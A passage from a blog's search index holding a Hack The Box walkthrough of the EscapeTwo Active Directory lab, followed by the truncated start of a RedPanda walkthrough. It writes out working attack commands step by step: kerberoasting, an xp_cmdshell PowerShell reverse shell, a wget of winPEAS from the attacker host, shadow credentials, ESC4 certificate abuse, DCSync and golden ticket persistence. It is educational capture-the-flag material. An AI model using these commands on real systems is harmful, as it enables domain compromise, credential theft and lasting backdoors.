139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time. | ssl-cert: Subject: commonName=DC01.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.sequel.htb | Not valid before: 2024-06-08T17:35:00 |_Not valid after: 2025-06-08T17:35:00 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.sequel.htb | Not valid before: 2024-06-08T17:35:00 |_Not valid after: 2025-06-08T17:35:00 |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time. 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-info: | 10.129.146.182:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 | ms-sql-ntlm-info: | 10.129.146.182:1433: | Target_Name: SEQUEL | NetBIOS_Domain_Name: SEQUEL | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: sequel.htb | DNS_Computer_Name: DC01.sequel.htb | DNS_Tree_Name: sequel.htb |_ Product_Version: 10.0.17763 |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2025-01-13T07:53:13 |_Not valid after: 2055-01-13T07:53:13 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.sequel.htb | Not valid before: 2024-06-08T17:35:00 |_Not valid after: 2025-06-08T17:35:00 |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time. | ssl-cert: Subject: commonName=DC01.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.sequel.htb | Not valid before: 2024-06-08T17:35:00 |_Not valid after: 2025-06-08T17:35:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49685/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49686/tcp open msrpc Microsoft Windows RPC 49689/tcp open msrpc Microsoft Windows RPC 49702/tcp open msrpc Microsoft Windows RPC 49718/tcp open msrpc Microsoft Windows RPC 49737/tcp open msrpc Microsoft Windows RPC 61431/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-01-13T08:00:32 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 1s, deviation: 0s, median: 0s OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 258.16 seconds Findings: LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Computers Users All domain objects A file containing all description fields It will also search the domain for any service/svc accounts and place them in a folder too. We have the naming context of the domain: kali in HTB/BlogEntriesMade/EscapeTwo/scans/ldap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:58:14 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass ------------------------------------------------------------ Server Information ------------------------------------------------------------ • IP Address : 10.129.146.182 • Domain Name : sequel.htb • Server Name : DC01 • Forest Level: 7 • Domain Level: 7 It turns out the anonymous bind is (+NOT+) enabled and we get the below information \u0026amp; our creds do not appear to work for the LDAP.\n------------------------------------------------------------ Connection Attempts ------------------------------------------------------------ • Attempting SSL connection... ⚠️ Connection established but no read access • Attempting non-SSL connection... ⚠️ Connection established but no read access ------------------------------------------------------------ Connection Failed ------------------------------------------------------------ ⚠️ Could not establish LDAP connection • Anonymous bind may be disabled (good security practice) • Credentials may be incorrect • Server may be unreachable • LDAP/LDAPS ports may be filtered We have the domain functionality level:\n• Forest Level: 7 • Domain Level: 7 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name \u0026amp; domain name:\n------------------------------------------------------------ Server Information ------------------------------------------------------------ • IP Address : 10.129.146.182 • Domain Name : sequel.htb • Server Name : DC01 It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026#34;sequel.htb\u0026#34; update_var machine \u0026#34;DC01\u0026#34; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: sudo echo \u0026#34;$box $domain $machine.$domain $machine\u0026#34; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.\nsudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. DNS 53: Using dnsenum to enumerate DNS entries:\ndnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing out of the ordinary. Kerberos 88: Using netexec or impacket for ASReproasting: We should always try and asreproast with a null/guest session as it can lead to an easy win:\nnetexec ldap $box -u $user -p $pass --asreproast asrep.txt Nothing found. Using netexec for Kerberoasting: As we have creds we can kerberoast:\nnetexec ldap $box -u $user -p $pass --kerberoast kerb.txt Two service accounts, ca_svc \u0026amp; sql_svc are kerberoastable. I am assuming that ca will be Certificate Authority. Attempting To Crack Kerberos Tickets: I attempt to crack the kerberos tickets but they do not crack: hashcat -m 13100 kerb.txt ~/Wordlists/rockyou.txt Lets move onto further enumeration. Performing a Bloodhound Collection: I use bloodhound-python to perform a collection.\nbloodhound-python -d $domain -ns $box -c All -u $user -p $pass I then import these into bloodhound for investigation. Bloodhound Findings: There is only 1 domain admin:\nStandard users have DC Sync Privileges:\nOur user has no overly permissive rights:\nSmall domain with only 8 users:\nsql_svc looks to be a good target as it will most likely have access to the SQL server but is also a member of these groups:\nca_svc is as suspected a member of the cert publishers group so can issue certs. We should look into using certipy-ad to enumerate the CA further.\nEnumerating The CA Using Certipy-ad: certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box kali in content-org/Walkthroughs/HTB/BlogEntriesMade/EscapeTwo 🍣 main 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:34:09 zsh ❯ certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;sequel-DC01-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;sequel-DC01-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for \u0026#39;sequel-DC01-CA\u0026#39; via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Got CA configuration for \u0026#39;sequel-DC01-CA\u0026#39; [*] Saved BloodHound data to \u0026#39;20250113084633_Certipy.zip\u0026#39;. Drag and drop the file into the BloodHound GUI from @ly4k [*] Saved text output to \u0026#39;20250113084633_Certipy.txt\u0026#39; [*] Saved JSON output to \u0026#39;20250113084633_Certipy.json\u0026#39; I upload these to bloodhound but they do not work, so let\u0026rsquo;s look at he .json Our current user does not have access to any vulnerable templates. SMB 445: Enumerating SMB shares using netexec: netexec smb $box -u $user -p $pass --shares We have READ rights over the \u0026ldquo;Accounting Department\u0026rdquo; share Enumerating the Accounting Department Share: I connect using smbclient:\nsmbclient -U $domain\\\\$user \u0026#34;\\\\\\\\$box\\\\Accounting Department\u0026#34; There are two spreadsheets in the share:\nI download them both:\nReading/Extracting Usernames \u0026amp; Passwords From The Spreadsheets: I try and open the spreadsheets using Open Office, but they appear to be cipher text:\nLuckily .xlsx are just file archives that contain spreadsheets. You can read more about them on this page , however the key part is this (bolding added by me)\nIn Excel 2007, XLSX files replaced .XLS files as the standard file for saving spreadsheets in Excel. Unlike XLS files, which store spreadsheet data in a single binary file, XLSX files are saved in the Open XML format, which stores data as separate files and folders in a compressed Zip package. The archive includes the [Content_Types].xml file, which describes the spreadsheet, and an .XML file for each worksheet within the spreadsheet.\nThis means we can manually extract the archive on our host to view the individual sheets contents. Extracting the contents of the xlsx files manually: unzip accounting_2024.xlsx unzip accounts.xlsx Reading the file \u0026ldquo;SharedStrings.xml\u0026rdquo; from the accounts.xlsx extraction we can see clear text passwords and emails.\nExtracting the contents of the xlsx files online: https://jumpshare.com/viewer/xlsx accounting_2024.xlsx content:\naccounts.xlsx contains user credentials:\nRunning Hashcat again: I re-run hashcat with newly extracted passwords against the extracted Kerberos tickets but they do not crack. Testing Credentials: I test the newly found credentials and find that Oscars are also valid:\nnetexec smb $box -u Users.txt -p Passwords.txt --continue-on-success | grep [+] Checking Bloodhound I can see that Oscar is a member of the Accounting Department group.\nThis group does not appear to have any interesting outbound object control however it\u0026rsquo;s good to note he is part of this group for later on. 2. Foothold: Enumerating As Oscar: I check what shares we have access to as Oscar \u0026amp; can see we have access to the Users share. netexec smb $box -u $user -p $pass --shares Accessing The Users Share As Oscar: I use smbclient to access the share.\nsmbclient -U $domain\\\\$user \u0026#34;\\\\\\\\$box\\\\Users\u0026#34; I check the \u0026ldquo;Default\u0026rdquo; folder present and it appears to be a default user installation of windows: Some initial enumeration does not yield any results MSSQL 1433: Enumerating The MSSQL Service: I check if the retrieved SQL credentials work against the MSSQL service using netexec:\nnetexec mssql $box -u $user -p $pass --local-auth It works and we can connect. Even though our name is sa which would indicate it is a sysadmin I use the mssql_priv to check if they are and if not to elevate it.\nnetexec mssql $box -u $user -p $pass --local-auth -M mssql_priv We are a sysadmin so let\u0026rsquo;s connect and get a reverse shell. Connecting to the MSSQL Service: We can use impacket-mssqlclient to connect to the instance.\nimpacket-mssqlclient $user@$box:$pass As we are a sysadmin we can enable xp_cmdshell\nxp_cmdshell primer: Core Functionality:\nAllows execution of Windows command shell (cmd.exe) commands directly from within SQL (+RCE+) Extended stored procedure that acts as a bridge between SQL Server and the operating system Returns command output as rows of text in the result set Limited to 8192 bytes for command strings Configuration Settings:\nDisabled by default since SQL Server 2005 Restricted to sysadmin role members only (which we are) Enabling xp_cmdshell For RCE On The Host: There are multiple ways we can enable xp_cmdshell, I will share two.\nManual method, from an MSSQL shell we can enter the below commands.\n-- Enable advanced options sp_configure \u0026#39;show advanced options\u0026#39;, 1; RECONFIGURE; -- Enable xp_cmdshell sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1; RECONFIGURE; Automatic method using impacket-mssqlclient built in functionality:\nLuckily impacket has built in functionality to enable this. -- Enable enable_xp_cmdshell RECONFIGURE Using RCE VIA xp_cmdshell To Get A Reverse Shell: I test a command \u0026amp; it works as expected. We have RCE of the underlying host.\nEXEC xp_cmdshell \u0026#39;dir C:\\\u0026#39;; -- We run commands like EXEC xp_cmdshell \u0026#39;[Command]\u0026#39;; +Important Note+: I found that xp_cmdshell would default to off again after a period of time so I had to re-enable it to execute commands. I go to revshells and use the base64 encoded powershell example. I start my listener on my local host and then enter the powershell base64 encoded reverse shell as a command via xp_cmdshell: EXEC xp_cmdshell \u0026#39;powershell -e [base64ReverseShell]\u0026#39; It connects. Enumerating As sql_svc: I check for the user flag but it is not present, so this makes me think that our target user is the user ryan who is also listed on this machine. Looking at their profile in Bloodhound, we can see they are part of the \u0026ldquo;Management Department\u0026rdquo; group which looks like it could be a good target. More importantly we can also see ryan has WriteOwner privileges over the CA_SVC account, which means we effectively have full control over that account if we can get control of him. I download winPEAs onto the host.\nwget http://10.10.14.38:9000/winPEASany.exe -o peas.exe I run it but nothing immediately jumps out. I check for contents of users descriptions \u0026amp; info fields, incase there are any stored credentials:\nGet-AdUser -Properties * -LDAPFilter \u0026#39;(\u0026amp;(objectCategory=user)(description=*))\u0026#39; | select samaccountname,description +Note+: This returns only users who\u0026rsquo;s description field is not blank Get-AdUser -Properties * -LDAPFilter \u0026#39;(\u0026amp;(objectCategory=user)(info=*))\u0026#39; | select samaccountname,info By manual enumeration I find the sql_svc password hardcoded in C:\\SQL2019\\ExpressAdv_ENU\\sql-Configuration.INI\nI verify it\u0026rsquo;s valid: +Note+: I actually wasted a lot of times on winPEAS etc when simple manual enumeration would have gotten me here far quicker. It\u0026rsquo;s important to not become too reliant on automated tools. Discovering Password Re-use for ryan \u0026amp; sql_svc: I perform password spraying with the password found in the sql-Configuration.INI file and find that the user sql_svc \u0026amp; ryan both share the same password.\nnetexec smb $box -u Users.txt -p Passwords.txt --shares --continue-on-success 3. Lateral Movement: Connecting As Ryan: I use evil-winrm to connect as Ryan\nevil-winrm -i $box -u $user -p $pass Lets get the user flag:\n4. Privilege Escalation: Taking Control of ca_svc: As ryan we have the WriteOwner privilege over CA_SVC so we effectively own the account. WriteOwner Privilege Primer: If we have WriteOwner over a: User: We can assign all rights to another account which will allow us to perform a Password Reset via a Force Change Password Attack, Targeted Kerberoasting Attack or a Shadow Credentials Attack. I would like to perform a targeted Kerberoasting Attack or Shadow Credentials attack, mainly as I do not like changing users passwords if I don\u0026rsquo;t have to. Group: We can add or remove members after we grant the new owner (which we control full privileges) GPO: We can modify it. GPO Attacks as well other DACL abuses (such as computer attacks). Targeted Kerberoasting Attack Primer: To perform this attack we need 1 of these rights over the user: WriteOwner GenericAll GenericWrite WriteProperty Validated-SPN WriteProperties Luckily as we have WriteOwner which means we have the ability to modify object security descriptors, regardless of permissions on the object\u0026rsquo;s DACL. +This works by doing the following:+\nAttach/generate an SPN for the user account. Request TGS for the user account. As TGS is encrypted with NTLM password hash we can then attempt to crack and overtake user account. Luckily targetedKerberoast does steps 1-2 automatically. Attack Chain Attempt 1: Targeted Kerberoasting: Attack Chain: Perform a Targeted Kerberoasting Attack to get the hash of the ca_svc user. Attempt to crack the hash. python3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user ca_svc -o ca_svc.kerb I attempt to crack the hash but it does not crack.\nAttack Chain Attempt 2: Shadow Credentials Attack: I have a full article explaining how the shadow credentials attack works here:\nhttps://bloodstiller.com/articles/shadowcredentialsattack/ Attack Chain:\nMake ourselves Owner of the ca_svc user account. Using impacket-owneredit. Grant ourselves full privileges over the ca_svc account. Using impacket-dacledit. Perform Shadow Credentials Attack. Using pywhisker. Use gettgtpkinit to create a .ccache. Use getnthash to extract the NT has of the ca_svc user. +Note+: Some of these tools can be finicky to install. I have a post here - https://bloodstiller.com/walkthroughs/certified-box/#performing-the-shadow-credentials-attack-against-management-svc which details how to install each of the tools and issues you may face.\nModify ownership so Ryan has full control of ca_svc:\nimpacket-owneredit -action write -new-owner \u0026#39;ryan\u0026#39; -target \u0026#39;ca_svc\u0026#39; $domain/$user:$pass Grant ryan full privileges over the user ca_svc:\nimpacket-dacledit -action \u0026#39;write\u0026#39; -rights \u0026#39;FullControl\u0026#39; -principal \u0026#39;ryan\u0026#39; -target \u0026#39;ca_svc\u0026#39; $domain/$user:$pass Add shadow credentials to the ca_svc account \u0026amp; export .PEM\npython3 pywhisker.py -d $domain -u $user -p $pass --target \u0026#34;CA_SVC\u0026#34; --action \u0026#34;add\u0026#34; --filename CACert --export PEM Ignore the capitlization of CA_SVC it doesn\u0026rsquo;t matter. +Deep Dive+: I have a deep dive on shadow credentials available here if you want to the how behind this attack vector: https://bloodstiller.com/articles/shadowcredentialsattack/ Requesting a TGT for ca_svc with PKINITtools getgtgkinit\nNow we perform the same process again to be able to extract their hash by using the .pem files we have retrieved to export a .ccache we can authenticate with. python3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem $domain/ca_svc ca_svc.ccache Next we will load the .ccache into our KRB5CCNAME variable as we will need this for next step:\nexport KRB5CCNAME=./ca_svc.ccache Requesting the ca_svc user hash with PKINITtools getnthash:\nExtract the NTHash for the ca_svc user: python3 /home/kali/windowsTools/PKINITtools/getnthash.py -key 431c[SNIP]6aee9c22ff3391d9 $domain/CA_SVC We now have the ca_svc users NT hash. Verify the hash is valid:\nWe now own the ca_svc user. Re-running Certipy As ca_svc: As we are in control of ca_svc let\u0026rsquo;s re-check if we have access to any vulnerable certificates to privesc: certipy-ad find -vulnerable -u $user@$domain -hashes :$hash -dc-ip $box So we can see there is a vulnerable cert available: DunderMifflinAuthentication and it\u0026rsquo;s vulnerable to the ESC4 attack vector. As we are part of the Cert Publishers group we can perform this attack:\nPerforming ESC4 Certificate Attack To Get An Admin Certificate: Checking the certipy git repo it details what we need to do to perform this attack. https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4 ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.\nSo we effectively perform an ESC1 attack by overwriting the template. Backup original cert:\nAs we overwrite the cert to perform this attack I will make a backup. certipy template -username ca_svc@$domain -hashes :$hash -template DunderMifflinAuthentication -save-old Perform ESC1 attack on the cert:\nWe can specify an arbitrary SAN with the -upn or -dns parameter.\nThis is the correct command, however read the section below if you get a DNS error.\nertipy req -username ca_svc@$domain -hashes :$hash -ca sequel-DC01-CA -target $machine.$domain -template DunderMifflinAuthentication -upn administrator@$domain -ns $box +Troubleshooting+: If you get the error CERTSRV_E_SUBJECT_DNS_REQUIRED:\nI got this error a lot and went down rabbit holes trying to fix it. Whereas it actually seems to be down to some sort cleanup script running on the host. How to get it working: I was able to get it working by quickly chaining step 1 (Backup Script) \u0026amp; 2 (ESC1 Attack) If you look at the time stamp you can see that I had to run these 7 seconds apart to get the attack chain to work. Authenticate as the Administrator using the certificate:\nNow we authenticate with the certificate, to receive the NT hash of the Administrator user: certipy-ad auth -pfx administrator.pfx -domain $domain Verify it works:\nUsing evil-winrm\nevil-winrm -i $box -u administrator -H $hash Using the .ccache\n#Load the .ccache into the KRB5CCNAME var export KRB5CCNAME=./administrator.ccache #Use impacket-psexec impacket-psexec -k -no-pass $machine.$domain I knew it work but always better to validate. Lets get the root flag:\n5. Persistence: You may be wondering why we would look at persistence if we already have a valid administrator certificate. However if we examine the expiration time on the cert we can see its only valid for 10 hours.\nklist So instead I will dump the NTDS.dit \u0026amp; create a golden ticket for good measure.\nDumping NTDS.dit/DCSync attack: Perform DCSync attack using netexec:\nnetexec smb $box -u administrator --use-kcache -M ntdsutil Extract all hashes from netexec\nfor file in /home/kali/.nxc/logs/*.ntds; do cat \u0026#34;$file\u0026#34; | cut -d \u0026#39;:\u0026#39; -f1,2,4 --output-delimiter=\u0026#39; \u0026#39; | awk \u0026#39;{print $3, $2, $1}\u0026#39;; printf \u0026#39;\\n\u0026#39;; done Creating a Kerberos Golden Ticket: Using impacket-lookupsid to get the Search for the Domain SID:\nimpacket-lookupsid $domain/$user@$machine.$domain -domain-sids -k -no-pass I store this in the variable $sid Using impacket-secretsdump to retrieve the aeskey of the krbtgt account:\nimpacket-secretsdump $domain/$user@$box -hashes :$hash I store krbtgt:aes256 value in the variable $krbtgt Sync our clock to the host using ntpdate:\n#Using ntpdate sudo ntpdate -s $domain #Using faketime faketime \u0026#34;$(ntpdate -q $domain | cut -d \u0026#39; \u0026#39; -f 1,2)\u0026#34; Using impacket-ticketer to create the Golden Ticket:\n#Using -aeskey impacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator Export the ticket to the KRB5CCNAME Variable:\nexport KRB5CCNAME=./Administrator.ccache Verify the ticket is loaded into memory:\nklist As we can see this ticket lasts for 10 years, which is better than 10 hours. Use the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain Why create a golden ticket? \u0026ldquo;But bloodstiller why are you making a golden ticket if you have the admin hash?\u0026rdquo; Glad you asked: Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why: KRBTGT Hash Dependence: Golden Tickets are generated using the KRBTGT account hash from the target’s domain controller. Unlike user account passwords, KRBTGT hashes are rarely rotated (and in many organizations, +they are never changed+), so in most cases the Golden Ticket remains valid indefinitely. KRBTGT Hash—The Key to It All (for upto 10 years): A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials. This makes it a reliable backdoor, especially if re-access is needed long after initial entry. Think about it: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the KRBTGT account, not individual users. Lessons Learned: What did I learn? Stop jumping to flashy techniques when you havent\u0026rsquo; even performed basic enumeration just yet. (Finding password re-use in a file) I learned that even though I know the attack path if someone has put a cleanup script in place it will cause me to go down a rabbit hole, it\u0026rsquo;s one of the few times where faster is better. What silly mistakes did I make? using \\\\ on http request e.g http:\\\\ DAMN YOU WINDOWS and your backslashes. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/escapetwo-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/htb\/": {
        "title": "HTB",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/htb\/"
    },
    
    "http:\/\/localhost:1313\/tags\/kerberoasting\/": {
        "title": "Kerberoasting",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/kerberoasting\/"
    },
    
    "http:\/\/localhost:1313\/tags\/kerberos\/": {
        "title": "Kerberos",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/kerberos\/"
    },
    
    "http:\/\/localhost:1313\/tags\/ldap\/": {
        "title": "LDAP",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/ldap\/"
    },
    
    "http:\/\/localhost:1313\/tags\/mssql\/": {
        "title": "MSSQL",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/mssql\/"
    },
    
    "http:\/\/localhost:1313\/tags\/shadow-credentials\/": {
        "title": "Shadow Credentials",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/shadow-credentials\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/": {
        "title": "Walkthroughs",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/"
    },
    
    "http:\/\/localhost:1313\/tags\/windows\/": {
        "title": "Windows",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/windows\/"
    },
    
    "http:\/\/localhost:1313\/tags\/writeowner\/": {
        "title": "WriteOwner",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/writeowner\/"
    },
    
    "http:\/\/localhost:1313\/tags\/xp_cmdshell\/": {
        "title": "Xp_cmdshell",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/xp_cmdshell\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/redpanda-box\/": {
        "title": "RedPanda HTB Walkthrough",
        "tags": [],
        "content": "RedPanda Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/RedPanda How I Use Variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan Kali in HTB/BlogEntriesMade/RedPanda/scans/nmap 🍣 main 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 15:17:33 zsh ❯ nmap $box -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 15:17 GMT Nmap scan report for 10.129.227.207 Host is up (0.039s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds Initial thoughts: SSH \u0026amp; Some sort of proxy. SSH is slow and long to bruteforce so the proxy will most likely be the entry-point. Comprehensive Scans: In depth scan TCP: sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/RedPanda/scans/nmap 🍣 main 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 15:19:23 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 15:19 GMT Nmap scan report for 10.129.227.207 Host is up (0.038s latency). Not shown: 65451 closed tcp ports (reset), 82 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 8080/tcp open http-proxy |_http-title: Red Panda Search | Made with Spring Boot |_http-open-proxy: Proxy might be redirecting requests | fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8 | Content-Language: en-US | Date: Fri, 27 Dec 2024 15:20:47 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34; dir=\u0026#34;ltr\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta author=\u0026#34;wooden_k\u0026#34;\u0026gt; | \u0026lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/panda.css\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; | 